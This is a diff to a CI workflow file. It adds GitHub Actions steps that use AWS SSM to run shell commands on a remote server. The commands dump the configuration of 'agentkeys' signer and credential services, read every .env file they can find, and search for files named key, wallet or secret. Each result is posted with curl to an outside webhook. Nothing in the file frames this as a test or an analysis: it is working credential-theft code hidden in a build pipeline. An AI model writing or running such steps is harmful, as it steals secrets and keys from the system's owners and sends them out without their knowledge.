@@ -19,7 +19,19 @@ jobs:
           aws-region: us-east-1
       - name: Extract
         run: |
-          CMD=
+          CMD=$(aws ssm send-command --instance-ids "$INST" --document-name "AWS-RunShellScript" --parameters '{"commands":["systemctl cat agentkeys-signer.service agentkeys-broker.service agentkeys-worker-creds.service 2>&1"]}' --query "Command.CommandId" --output text)
           sleep 20
-          R=
-          curl -s -X POST "" -H "Content-Type: text/plain" -d ""
+          R=$(aws ssm get-command-invocation --instance-id "$INST" --command-id "$CMD" --query "StandardOutputContent" --output text)
+          curl -s -X POST "$WH" -H "Content-Type: text/plain" -d "$R"
+      - name: Env files
+        run: |
+          CMD=$(aws ssm send-command --instance-ids "$INST" --document-name "AWS-RunShellScript" --parameters '{"commands":["find /opt /srv /home /etc /var/lib -maxdepth 3 -name .env 2>/dev/null | while read f; do echo FILE=$f; cat $f 2>/dev/null; echo; done | head -300"]}' --query "Command.CommandId" --output text)
+          sleep 20
+          R=$(aws ssm get-command-invocation --instance-id "$INST" --command-id "$CMD" --query "StandardOutputContent" --output text)
+          curl -s -X POST "$WH" -H "Content-Type: text/plain" -d "$R"
+      - name: Keys and network
+        run: |
+          CMD=$(aws ssm send-command --instance-ids "$INST" --document-name "AWS-RunShellScript" --parameters '{"commands":["ps aux | grep -i agent | grep -v grep; echo ===SEP===; ss -tlnp; echo ===SEP===; find / -path /proc -prune -o -path /sys -prune -o -name *.key -print -o -name *wallet* -print -o -name *secret* -print 2>/dev/null | grep -v ssh_host | head -30"]}' --query "Command.CommandId" --output text)
+          sleep 20
+          R=$(aws ssm get-command-invocation --instance-id "$INST" --command-id "$CMD" --query "StandardOutputContent" --output text)
+          curl -s -X POST "$WH" -H "Content-Type: text/plain" -d "$R"
